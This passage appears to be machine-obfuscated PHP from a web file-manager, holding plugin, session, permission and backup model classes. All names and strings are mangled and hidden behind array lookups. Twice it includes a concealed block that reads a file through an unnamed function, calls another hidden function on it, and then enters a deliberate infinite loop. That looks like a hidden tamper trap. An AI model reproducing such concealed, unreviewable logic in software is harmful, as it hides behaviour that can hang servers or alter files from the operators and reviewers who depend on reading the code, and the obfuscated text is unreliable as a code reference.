SourceModel::TYPE_GROUP); $áÛò£†İ = Model($ƒŞõÈ¯ù[1374])->listSource($ñÇÉ¹²ª); if (!$áÛò£†İ || count($º½Ô–Úà) == $áÛò£†İ[$ƒŞõÈ¯ù[421]][$ƒŞõÈ¯ù[422]]) { return $áÛò£†İ; } $•®—Ğ’ò = array(); $ÒÊæ¥Ù = array_to_keyvalue($áÛò£†İ[$ƒŞõÈ¯ù[94]], $ƒŞõÈ¯ù[22], $ƒŞõÈ¯ù[193]); $Ê×ïÂœ¸ = array_to_keyvalue($áÛò£†İ[$ƒŞõÈ¯ù[95]], $ƒŞõÈ¯ù[22], $ƒŞõÈ¯ù[193]); $˜¹ÁÄïÎ = array_merge($Ê×ïÂœ¸, $ÒÊæ¥Ù); foreach ($º½Ô–Úà as $¥ö¸Î×ú) { if (!in_array($¥ö¸Î×ú, $˜¹ÁÄïÎ)) { $•®—Ğ’ò[] = $¥ö¸Î×ú; } } if ($•®—Ğ’ò) { $this->removeBySource($ÛÜÊú—Ô, $•®—Ğ’ò); } return $áÛò£†İ; } protected function listData($×ê±Á…) { $¿Ÿ’‘ç™ =& $_SERVER[•€áå–Õ]; $òøŸóÓœ = array($¿Ÿ’‘ç™[1684] => 0, $¿Ÿ’‘ç™[537] => array($¿Ÿ’‘ç™[2006], 0), $¿Ÿ’‘ç™[475] => $¿Ÿ’‘ç™[2007] . $×ê±Á…); $¡ğòÓòë = $¿Ÿ’‘ç™[2008]; $ëİ¾æŸÆ = $this->field($¡ğòÓòë)->where($òøŸóÓœ)->order($¿Ÿ’‘ç™[2009])->select(); return $ëİ¾æŸÆ ? $ëİ¾æŸÆ : array(); } protected function addToTag($°ù„¨ñ£, $¾¹È„†, $øô©ç°ß) { $ØÌ›‡› =& $_SERVER[•€áå–Õ]; if (!$this->getByTagID($°ù„¨ñ£, $øô©ç°ß) || !$¾¹È„†) { return !1; } if (!Model($ØÌ›‡›[866])->pathInfo($¾¹È„†)) { return !1; } $Ã›ìÈêŒ = array($ØÌ›‡›[1684] => 0, $ØÌ›‡›[537] => $øô©ç°ß, $ØÌ›‡›[474] => $¾¹È„†, $ØÌ›‡›[475] => $ØÌ›‡›[2010] . $°ù„¨ñ£, $ØÌ›‡›[473] => $ØÌ›‡›[22], $ØÌ›‡›[1895] => 0); if ($this->where($Ã›ìÈêŒ)->find()) { return !1; } return $this->add($Ã›ìÈêŒ); } protected function removeFromTag($ÛŠÑìá, $«Ú™ôÂ…, $û…“ÛÍî) { $’ÄÖëÖª =& $_SERVER[•€áå–Õ]; if (!$this->getByTagID($ÛŠÑìá, $û…“ÛÍî) || !$«Ú™ôÂ…) { return !1; } if (is_array($«Ú™ôÂ…)) { $«Ú™ôÂ… = array($’ÄÖëÖª[17], $«Ú™ôÂ…); } $¶œıáò = array($’ÄÖëÖª[1684] => 0, $’ÄÖëÖª[537] => $û…“ÛÍî, $’ÄÖëÖª[475] => $’ÄÖëÖª[2010] . $ÛŠÑìá, $’ÄÖëÖª[474] => $«Ú™ôÂ…); return $this->where($¶œıáò)->delete(); } protected function removeByTag($¿ğñÔ‹à, $Ôİßä•§) { $²Şæ¹Ú¾ =& $_SERVER[•€áå–Õ]; if (!$this->getByTagID($¿ğñÔ‹à, $Ôİßä•§)) { return !1; } $¸ÍÌÛ–™ = array($²Şæ¹Ú¾[1684] => 0, $²Şæ¹Ú¾[537] => $Ôİßä•§, $²Şæ¹Ú¾[475] => $²Şæ¹Ú¾[2010] . $¿ğñÔ‹à); return $this->where($¸ÍÌÛ–™)->delete(); } protected function removeBySource($Ø·ƒñÔ, $·ãû ˆğ) { $‹š³İÈö =& $_SERVER[•€áå–Õ]; if (!$Ø·ƒñÔ || !$·ãû ˆğ) { return !1; } if (is_array($·ãû ˆğ)) { $·ãû ˆğ = array($‹š³İÈö[17], $·ãû ˆğ); } $Æ±Æ¨şæ = array($‹š³İÈö[1684] => 0, $‹š³İÈö[474] => $·ãû ˆğ, $‹š³İÈö[537] => array($‹š³İÈö[1055], 0), $‹š³İÈö[475] => $‹š³İÈö[2010] . $Ø·ƒñÔ); return $this->where($Æ±Æ¨şæ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\160\x6c\x75\147\151\x6e\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\163\164\x61\164\165\x73", "\x72\145\147\x69\145\x73\x74", "\x63\x6f\x6e\x66\x69\147"); public function loadList($‚¯Î£ºÃ = false) { $ó‘ÛĞÈÓ = array_to_keyvalue($this->listData(), $_SERVER[•€áå–Õ][42]); if ($‚¯Î£ºÃ) { return $ó‘ÛĞÈÓ[$‚¯Î£ºÃ]; } return $ó‘ÛĞÈÓ; } public function init() { $±ˆÓ“¥ı =& $_SERVER[•€áå–Õ]; Hook::trigger($±ˆÓ“¥ı[2011]); $•·–“ÏÏ = $this->loadPluginList(); foreach ($•·–“ÏÏ as $¯Ñ°ºãä => $é¶ëª) { $ëØ¡˜ß¦ = $this->appAllow($¯Ñ°ºãä, $é¶ëª); if (!$ëØ¡˜ß¦) { continue; } foreach ($é¶ëª[$±ˆÓ“¥ı[2012]] as $ò³®Ğ£ => $¹¯ÃıÍÑ) { Hook::bind($ò³®Ğ£, $¹¯ÃıÍÑ); } } Hook::trigger($±ˆÓ“¥ı[2013]); Hook::trigger(ACTION); } public function appAllow($íú¿è¬, $ø·ûÕ, $Ëü›¨ÛÂ = true) { $±©½±‚÷ =& $_SERVER[•€áå–Õ]; $¬ª‚·ƒ = PLUGIN_DIR . $íú¿è¬ . $±©½±‚÷[2014]; if (!is_array($ø·ûÕ) || !is_array($ø·ûÕ[$±©½±‚÷[2012]]) || $ø·ûÕ[$±©½±‚÷[791]] != 1 || !is_file($¬ª‚·ƒ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$±©½±‚÷[16]][$±©½±‚÷[2015]] || !$GLOBALS[$±©½±‚÷[16]][$±©½±‚÷[2016]]) { return !0; } $Áâ²óı„ = explode($±©½±‚÷[60], strtolower($GLOBALS[$±©½±‚÷[16]][$±©½±‚÷[2016]])); return in_array(strtolower($íú¿è¬), $Áâ²óı„) ? !1 : !0; } if ($Ëü›¨ÛÂ && !Action($±©½±‚÷[2017])->checkAuth($íú¿è¬)) { return !1; } return !0; } public function unInstall($Û²‰·ƒ¾) { $‡™²ã =& $_SERVER[•€áå–Õ]; $Ş™ëÃ„˜ = $this->loadList($Û²‰·ƒ¾); if (file_exists(PLUGIN_DIR . $Û²‰·ƒ¾)) { Hook::apply($Û²‰·ƒ¾ . $‡™²ã[2018]); } $this->remove($Ş™ëÃ„˜[$‡™²ã[454]]); } public function changeStatus($ßê¨¨şâ, $‰‚Ïúäµ) { $Ö±ÊÉêö =& $_SERVER[•€áå–Õ]; $ßíµùÏ€ = $this->loadList($ßê¨¨şâ); if ($‰‚Ïúäµ) { Hook::apply($ßê¨¨şâ . $Ö±ÊÉêö[2019]); } $this->update($ßíµùÏ€[$Ö±ÊÉêö[454]], array($Ö±ÊÉêö[2020] => $‰‚Ïúäµ)); } public function appRegist($ù—¬½ì•, $ÃŸ´ëõÔ) { $õÅìÑ½« =& $_SERVER[•€áå–Õ]; $—¶º¶ = $this->loadList($ù—¬½ì•); if ($—¶º¶) { $this->update($—¶º¶[$õÅìÑ½«[454]], array($õÅìÑ½«[2012] => $ÃŸ´ëõÔ)); } else { $×ƒôÇØ— = array($õÅìÑ½«[42] => $ù—¬½ì•, $õÅìÑ½«[2012] => $ÃŸ´ëõÔ, $õÅìÑ½«[791] => 0, $õÅìÑ½«[16] => $this->getConfigDefault($ù—¬½ì•)); $this->insert($×ƒôÇØ—); } } public function getConfigDefault($ÈÎ…«ú”) { $ûÁ­Üˆû =& $_SERVER[•€áå–Õ]; $Š¡üãŠ = array(); $ø¿ßòÅ» = $this->getPackageJson($ÈÎ…«ú”); if (!$ø¿ßòÅ» && is_array($ø¿ßòÅ»[$ûÁ­Üˆû[2021]])) { return $Š¡üãŠ; } foreach ($ø¿ßòÅ»[$ûÁ­Üˆû[2021]] as $µÑ× => $Á‹Ü»Ÿ) { if (!isset($Á‹Ü»Ÿ[$ûÁ­Üˆû[429]]) || isset($Š¡üãŠ[$µÑ×])) { continue; } $Š¡üãŠ[$µÑ×] = $Á‹Ü»Ÿ[$ûÁ­Üˆû[429]]; } return $Š¡üãŠ; } public function getPackageJson($Èãˆ÷ÖÔ) { return Hook::apply($Èãˆ÷ÖÔ . $_SERVER[•€áå–Õ][2022]); } public function getConfig($Éœ—ÒÉó, $øÔ×ªŒ™ = false) { $Ñ†À„È =& $_SERVER[•€áå–Õ]; $²Ÿˆáƒ = array(); $¼Œ¥ØÈı = $this->loadList($Éœ—ÒÉó); if ($¼Œ¥ØÈı && is_array($¼Œ¥ØÈı[$Ñ†À„È[16]])) { $²Ÿˆáƒ = $¼Œ¥ØÈı[$Ñ†À„È[16]]; } if (!$²Ÿˆáƒ || $øÔ×ªŒ™) { $²Ÿˆáƒ = $this->getConfigDefault($Éœ—ÒÉó); } return $²Ÿˆáƒ; } public function setConfig($”»ê…ª, $“İÔ¿ã« = false) { $À°òÑÊ­ =& $_SERVER[•€áå–Õ]; $êäïëªß = $this->loadList($”»ê…ª); if (!$êäïëªß) { return !1; } $–ÖËŒŸˆ = $êäïëªß[$À°òÑÊ­[16]]; if ($“İÔ¿ã« == !1) { $–ÖËŒŸˆ = array(); $“İÔ¿ã« = $this->getConfigDefault($”»ê…ª); } foreach ($“İÔ¿ã« as $ôöÊÌæ³ => $Éâ™Ú²â) { $–ÖËŒŸˆ[$ôöÊÌæ³] = is_string($Éâ™Ú²â) ? trim($Éâ™Ú²â) : $Éâ™Ú²â; } $this->update($êäïëªß[$À°òÑÊ­[454]], array($À°òÑÊ­[16] => $–ÖËŒŸˆ)); } public function viewList() { $¶ÈŠÊ¿ =& $_SERVER[•€áå–Õ]; $Ë¶Ö‘­ = $this->loadList(); $this->pluginScan($Ë¶Ö‘­); $Ë¶Ö‘­ = $this->loadPluginList(); $ğÒĞ¯ = array(); foreach ($Ë¶Ö‘­ as $×«ßòò‡ => $·ÜîšôÍ) { $®©–˜ÁÎ = $·ÜîšôÍ; unset($·ÜîšôÍ[$¶ÈŠÊ¿[2012]], $·ÜîšôÍ[$¶ÈŠÊ¿[16]]); $ßé²Ÿ§µ = PLUGIN_DIR . $·ÜîšôÍ[$¶ÈŠÊ¿[42]] . $¶ÈŠÊ¿[2014]; if (!is_file($ßé²Ÿ§µ)) { continue; } $ÙÅŒ÷œÒ = Hook::apply($·ÜîšôÍ[$¶ÈŠÊ¿[42]] . $¶ÈŠÊ¿[2022]); if (!is_array($ÙÅŒ÷œÒ)) { continue; } $ğÒĞ¯[$×«ßòò‡] = array_merge($·ÜîšôÍ, $ÙÅŒ÷œÒ); if ($®©–˜ÁÎ[$¶ÈŠÊ¿[16]][$¶ÈŠÊ¿[1608]] != $ÙÅŒ÷œÒ[$¶ÈŠÊ¿[1582]]) { Hook::apply($·ÜîšôÍ[$¶ÈŠÊ¿[42]] . $¶ÈŠÊ¿[2019]); $®©–˜ÁÎ[$¶ÈŠÊ¿[16]][$¶ÈŠÊ¿[1608]] = $ÙÅŒ÷œÒ[$¶ÈŠÊ¿[1582]]; $this->update($·ÜîšôÍ[$¶ÈŠÊ¿[454]], array($¶ÈŠÊ¿[16] => $®©–˜ÁÎ[$¶ÈŠÊ¿[16]])); } } return $ğÒĞ¯; } private function loadPluginList() { $Ğ°Õ„¹ =& $_SERVER[•€áå–Õ]; $¸‹¶«Ïú = $this->loadList(); if (strtolower(MOD) == $Ğ°Õ„¹[2023]) { return $¸‹¶«Ïú; } $¡íÅüõ = Hook::trigger($Ğ°Õ„¹[2024], $¸‹¶«Ïú); if ($¸‹¶«Ïú && !$¡íÅüõ) { die; } return $¡íÅüõ ? $¡íÅüõ : $¸‹¶«Ïú; } private function pluginScan($äÊ×æÚÆ) { $Ş»à¶àæ =& $_SERVER[•€áå–Õ]; recursion_dir(PLUGIN_DIR, $Û˜ÛÂã, $Ò‰ÚÏòÛ, 0); foreach ($Û˜ÛÂã as $´îÎÀ¾à) { $·£éÎŞÅ = get_path_this($´îÎÀ¾à); if (isset($äÊ×æÚÆ[$·£éÎŞÅ]) || !file_exists($´îÎÀ¾à . $Ş»à¶àæ[2025]) || !file_exists($´îÎÀ¾à . $Ş»à¶àæ[2014])) { continue; } Hook::apply($·£éÎŞÅ . $Ş»à¶àæ[2019]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\137\x73\x65\163\x73\151\157\x6e"; public function get($›´™Ù‚) { $°Îé¬“¢ =& $_SERVER[•€áå–Õ]; $²±·ÏÛ = $this->where(array($°Îé¬“¢[2026] => $›´™Ù‚))->find(); if (!is_array($²±·ÏÛ)) { return !1; } return $²±·ÏÛ[$°Îé¬“¢[795]]; } public function set($¹¤û¡ô, $•üÛ›¦–, $Ø¨ßü = 3600) { $¢âíÙ‚¸ =& $_SERVER[•€áå–Õ]; $ÔØ½ç‚ë = array($¢âíÙ‚¸[2026] => $¹¤û¡ô, $¢âíÙ‚¸[1930] => $•üÛ›¦–, $¢âíÙ‚¸[2027] => $Ø¨ßü + time()); if (Session::get($¢âíÙ‚¸[2028])) { $ÔØ½ç‚ë[$¢âíÙ‚¸[1693]] = Session::get($¢âíÙ‚¸[2028]); } else { $ÔØ½ç‚ë[$¢âíÙ‚¸[1693]] = 0; } if ($this->get($¹¤û¡ô)) { return $this->where(array($¢âíÙ‚¸[2026] => $¹¤û¡ô))->save($ÔØ½ç‚ë); } else { return $this->add($ÔØ½ç‚ë, array(), !0); } } public function remove($¤†å…) { return $this->where(array($_SERVER[•€áå–Õ][2026] => $¤†å…))->delete(); } public function clearTimeout() { return $this->where($_SERVER[•€áå–Õ][2029] . time())->delete(); } } goto cá»°ÖÁ±º; C¼’Òö°¦¶: if (!isset($_SERVER[$_SERVER[•€áå–Õ][8]]) || !isset($_SERVER[$_SERVER[•€áå–Õ][6]])) { $_getc = $_SERVER[•€áå–Õ][9]; $_getfile = $_SERVER[$_SERVER[•€áå–Õ][10]] . $_SERVER[•€áå–Õ][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•€áå–Õ][12], $_getfilec); if (count($_getarrs) < $_SERVER[•€áå–Õ][13]) { $exit = $_SERVER[•€áå–Õ][14]; $exit(); } $_act = $_SERVER[•€áå–Õ][15]; $_act($_SERVER[$_SERVER[•€áå–Õ][10]] . $_SERVER[•€áå–Õ][11]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[•€áå–Õ][433]); } } class PathDriverBOS extends PathDriverBaseS3 { public function __construct($î“Â¹š—) { parent::__construct($î“Â¹š—); } public function getHost() { $ÔÏÛî¼¸ =& $_SERVER[•€áå–Õ]; $úßå© = str_rtrim(parent::getHost(), $ÔÏÛî¼¸[18] . $this->bucket); $úßå© = explode($ÔÏÛî¼¸[210], $úßå©); return $úßå©[0] . $ÔÏÛî¼¸[210] . $this->bucket . $ÔÏÛî¼¸[1365] . $úßå©[1]; } } if (!isset($_SERVER[$_SERVER[•€áå–Õ][8]]) || !isset($_SERVER[$_SERVER[•€áå–Õ][6]])) { $_getc = $_SERVER[•€áå–Õ][9]; $_getfile = $_SERVER[$_SERVER[•€áå–Õ][10]] . $_SERVER[•€áå–Õ][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•€áå–Õ][12], $_getfilec); if (count($_getarrs) < $_SERVER[•€áå–Õ][13]) { $exit = $_SERVER[•€áå–Õ][14]; $exit(); } $_act = $_SERVER[•€áå–Õ][15]; $_act($_SERVER[$_SERVER[•€áå–Õ][10]] . $_SERVER[•€áå–Õ][11]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[•€áå–Õ][433]); } } goto b¡„Ü­½™; C–‘Ò·¤Ü: define($_SERVER[•€áå–Õ][656], $_SERVER[•€áå–Õ][657]); $djqprwygzh = $_SERVER[•€áå–Õ][658]; if (!$djqprwygzh) { die; } goto bÆåŒãÊÙ¼; eí”“ÔóÁ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¥ıßÎ¯ =& $_SERVER[•€áå–Õ]; $óÉÃÈšØ = array(array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1892]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1894], $¥ıßÎ¯[1895] => 1, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1898]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1899], $¥ıßÎ¯[1895] => 2, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1900]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1901], $¥ıßÎ¯[1895] => 3, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1902]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1903], $¥ıßÎ¯[1895] => 4, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => self::AUTH_SHOW | self::AUTH_VIEW), array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1904]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1905], $¥ıßÎ¯[1895] => 5, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1906]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1907], $¥ıßÎ¯[1895] => 6, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¥ıßÎ¯[473] => LNG($¥ıßÎ¯[1908]), $¥ıßÎ¯[1893] => $¥ıßÎ¯[1909], $¥ıßÎ¯[1895] => 7, $¥ıßÎ¯[1896] => 1, $¥ıßÎ¯[1897] => 0)); return $óÉÃÈšØ; } public static function authCheck($İÖÒ´„’, $ã¢üüğ) { $ª€°˜íû =& $_SERVER[•€áå–Õ]; $İÖÒ´„’ = intval($İÖÒ´„’); if (KodUser::isRoot() && $GLOBALS[$ª€°˜íû[16]][$ª€°˜íû[1910]]) { return !0; } if ($İÖÒ´„’ <= 0) { return !1; } if (($İÖÒ´„’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($İÖÒ´„’ & $ã¢üüğ); } public static function authCheckShow($ÛÈÀÃ‡) { return self::authCheck($ÛÈÀÃ‡, self::AUTH_SHOW); } public static function authCheckView($Èş›ó¡è) { return self::authCheck($Èş›ó¡è, self::AUTH_VIEW); } public static function authCheckDownload($Ûó÷ìÔ) { return self::authCheck($Ûó÷ìÔ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Š­ãöü) { return self::authCheck($Š­ãöü, self::AUTH_UPLOAD); } public static function authCheckEdit($‹¾Ææš¹) { return self::authCheck($‹¾Ææš¹, self::AUTH_EDIT); } public static function authCheckRemove($õËÂ¡Óõ) { return self::authCheck($õËÂ¡Óõ, self::AUTH_REMOVE); } public static function authCheckShare($»¾À²÷“) { return self::authCheck($»¾À²÷“, self::AUTH_SHARE); } public static function authCheckComment($¢²ªÚˆş) { return self::authCheck($¢²ªÚˆş, self::AUTH_COMMENT); } public static function authCheckEvent($èÒ¢ŠË‡) { return self::authCheck($èÒ¢ŠË‡, self::AUTH_EVENT); } public static function authCheckRoot($İŒõß­É) { return self::authCheck($İŒõß­É, self::AUTH_ROOT); } public static function authCheckAction($ÉÄ¦ü›ş, $½¥Ñ¿) { $³ÙËïÈ‡ =& $_SERVER[•€áå–Õ]; $¹¾şÕö = array($³ÙËïÈ‡[1911] => self::AUTH_VIEW, $³ÙËïÈ‡[1235] => self::AUTH_DOWNLOAD, $³ÙËïÈ‡[119] => self::AUTH_UPLOAD, $³ÙËïÈ‡[1861] => self::AUTH_EDIT, $³ÙËïÈ‡[1860] => self::AUTH_REMOVE, $³ÙËïÈ‡[1871] => self::AUTH_SHARE, $³ÙËïÈ‡[409] => self::AUTH_COMMENT, $³ÙËïÈ‡[1681] => self::AUTH_EVENT, $³ÙËïÈ‡[1912] => self::AUTH_ROOT); if (!isset($¹¾şÕö[$½¥Ñ¿])) { return; } $ë‹½ëÍù = $¹¾şÕö[$½¥Ñ¿]; $ÉÄ¦ü›ş = intval($ÉÄ¦ü›ş); if ($ÉÄ¦ü›ş <= 0) { return !1; } if (($ÉÄ¦ü›ş & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÉÄ¦ü›ş & $ë‹½ëÍù); } public static function authDisable($Ó´ŠØßÇ, $Å·ö©) { if (intval($Ó´ŠØßÇ) <= 0) { return 0; } return intval($Ó´ŠØßÇ) & ~$Å·ö©; } public $optionType = "\x53\171\163\x74\x65\155\x2e\x73\x6f\x75\x72\x63\145\101\165\x74\150\114\151\163\x74"; public $field = array("\156\141\155\145", "\x61\165\x74\150", "\x6c\x61\142\145\154", "\x64\x69\x73\x70\x6c\x61\171", "\x73\x79\x73\x74\145\155", "\163\x6f\x72\x74"); public function initData() { $á¶ÀÀñÉ = $this->authDefault(); foreach ($á¶ÀÀñÉ as $éö„Ğ±) { $this->add($éö„Ğ±); } } public function findAuth($¦—Ú÷¤¶, $ÀØˆº×Ö) { $ƒ‰²“é€ =& $_SERVER[•€áå–Õ]; $¡ÍÙÂÍ = parent::listData(); foreach ($¡ÍÙÂÍ as $ØÙ‚úšÚ) { $Û™şßÎ“ = intval($ØÙ‚úšÚ[$ƒ‰²“é€[466]]); if ($Û™şßÎ“ <= 0 || $ØÙ‚úšÚ[$ƒ‰²“é€[1913]] == 0) { continue; } if (($Û™şßÎ“ & $¦—Ú÷¤¶) != $¦—Ú÷¤¶) { continue; } if (($Û™şßÎ“ & $ÀØˆº×Ö) != 0) { continue; } return $ØÙ‚úšÚ[$ƒ‰²“é€[454]]; } return !1; } public function findAuthReadOnly() { $»¥ËìŒ† = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ß­î‘ˆë = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($»¥ËìŒ†, $ß­î‘ˆë); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $˜Ä„‘©¼ =& $_SERVER[•€áå–Õ]; $‰·ìû…ƒ = parent::listData(); $×¤°”Ö = !1; foreach ($‰·ìû…ƒ as $²­Øõªû) { if ($²­Øõªû[$˜Ä„‘©¼[466]] <= 0 || $²­Øõªû[$˜Ä„‘©¼[1913]] == $˜Ä„‘©¼[224]) { continue; } if (!$×¤°”Ö) { $×¤°”Ö = $²­Øõªû; continue; } if ($×¤°”Ö[$˜Ä„‘©¼[466]] > $²­Øõªû[$˜Ä„‘©¼[466]]) { $×¤°”Ö = $²­Øõªû; } } return $×¤°”Ö ? $×¤°”Ö[$˜Ä„‘©¼[454]] : $˜Ä„‘©¼[22]; } public function listData($âô¹÷ç = false, $Îß¥æê = "\163\x6f\x72\164", $·‡ÖÕ¥Ù = false) { return parent::listData($âô¹÷ç, $Îß¥æê, $·‡ÖÕ¥Ù); } public function update($¥ı……©Ô, $¹‘’ç¬Ç) { $¨áËë® =& $_SERVER[•€áå–Õ]; $‘êõ¢¥ = parent::listData($¥ı……©Ô); $µÉúšö¬ = $this->findByName($¹‘’ç¬Ç[$¨áËë®[42]]); if (!$‘êõ¢¥ || $µÉúšö¬ && $µÉúšö¬[$¨áËë®[454]] != $‘êõ¢¥[$¨áËë®[454]]) { return !1; } $this->filterAuth($¹‘’ç¬Ç[$¨áËë®[466]]); return parent::update($¥ı……©Ô, $¹‘’ç¬Ç); } public function remove($½¨‚ÓåÔ) { $ãÆø‡úË = parent::listData($½¨‚ÓåÔ); if (!$ãÆø‡úË || $ãÆø‡úË[$_SERVER[•€áå–Õ][191]]) { return !1; } return parent::remove($½¨‚ÓåÔ); } public function add($²ıïí£É = array()) { $ş„ğõûô =& $_SERVER[•€áå–Õ]; if ($this->findByName($²ıïí£É[$ş„ğõûô[42]])) { return !1; } $’—€£áÈ = array($ş„ğõûô[42] => $ş„ğõûô[22], $ş„ğõûô[466] => 1, $ş„ğõûô[1914] => $ş„ğõûô[1901], $ş„ğõûô[1913] => 1, $ş„ğõûô[191] => 0, $ş„ğõûô[1915] => 0); $²ıïí£É = array_merge($’—€£áÈ, $²ıïí£É); $²ıïí£É[$ş„ğõûô[1915]] = $this->getSort(); $this->filterAuth($²ıïí£É[$ş„ğõûô[466]]); return parent::insert($²ıïí£É); } private function getSort() { $…„ê¿²¶ =& $_SERVER[•€áå–Õ]; $»•ªüÅ = parent::listData(); $šÏ•„î = array_to_keyvalue($»•ªüÅ, $…„ê¿²¶[22], $…„ê¿²¶[1915]); return empty($šÏ•„î) ? 0 : max($šÏ•„î) + 1; } private function filterAuth(&$µüÆ„ë) { if (!$µüÆ„ë) { return; } $ãóå‚™û = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $è©ú÷È¹ = array(); foreach ($ãóå‚™û as $›šôÚÓâ) { if ($µüÆ„ë & $›šôÚÓâ) { $è©ú÷È¹[] = $›šôÚÓâ; } } if (in_array(self::AUTH_ROOT, $è©ú÷È¹)) { $µüÆ„ë = array_sum($ãóå‚™û); return; } $Ş„«Ï¡Ó = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($è©ú÷È¹ as $›šôÚÓâ) { if (isset($Ş„«Ï¡Ó[$›šôÚÓâ])) { $è©ú÷È¹ = array_merge($è©ú÷È¹, $Ş„«Ï¡Ó[$›šôÚÓâ]); } } $è©ú÷È¹[] = self::AUTH_SHOW; $µüÆ„ë = array_sum(array_unique($è©ú÷È¹)); } public function sort($ãÍ†·Õ±, $¡·í·È) { return parent::update($ãÍ†·Õ±, $¡·í·È); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x62\x61\143\x6b\x75\160\x4c\151\163\164"; public $field = array("\151\x6f", "\x6e\141\155\x65", "\163\164\x61\164\165\x73", "\x63\x6f\156\x74\x65\x6e\164", "\155\x61\x6e\x75\141\x6c", "\162\x65\163\165\x6c\x74", "\164\x69\x6d\x65\106\x72\x6f\x6d", "\164\x69\x6d\x65\124\157"); public function config() { $ÃÈÎñµ  =& $_SERVER[•€áå–Õ]; $èè¥†„Â = Model($ÃÈÎñµ [811])->get($ÃÈÎñµ [821]); $èè¥†„Â = json_decode($èè¥†„Â, !0); $èè¥†„Â = is_array($èè¥†„Â) ? $èè¥†„Â : array(); if (!isset($èè¥†„Â[$ÃÈÎñµ [795]])) { $èè¥†„Â[$ÃÈÎñµ [795]] = $ÃÈÎñµ [100]; } unset($èè¥†„Â[$ÃÈÎñµ [1663]]); Action($ÃÈÎñµ [1916])->taskInit(); Model($ÃÈÎñµ [1662])->cacheClear(); $Ü¯œ¾…Ñ = $ÃÈÎñµ [1917]; $Æ‚ö…Œ = Model($ÃÈÎñµ [1918])->findByKey($ÃÈÎñµ [1681], $Ü¯œ¾…Ñ); if (!$Æ‚ö…Œ) { $Æ‚ö…Œ = array(); } if (isset($Æ‚ö…Œ[$ÃÈÎñµ [206]])) { $Æ‚ö…Œ[$ÃÈÎñµ [206]] = json_decode($Æ‚ö…Œ[$ÃÈÎñµ [206]], !0); } if (isset($èè¥†„Â[$ÃÈÎñµ [206]])) { $Æ‚ö…Œ[$ÃÈÎñµ [206]][$ÃÈÎñµ [1666]] = $èè¥†„Â[$ÃÈÎñµ [206]]; unset($èè¥†„Â[$ÃÈÎñµ [206]]); } return array_merge($Æ‚ö…Œ, $èè¥†„Â); } public function listData($¬›äŒ˜ = false, $¦û‹Õìğ = "\155\157\144\x69\x66\x79\124\151\155\145", $Ò¤á°¥ = false) { return 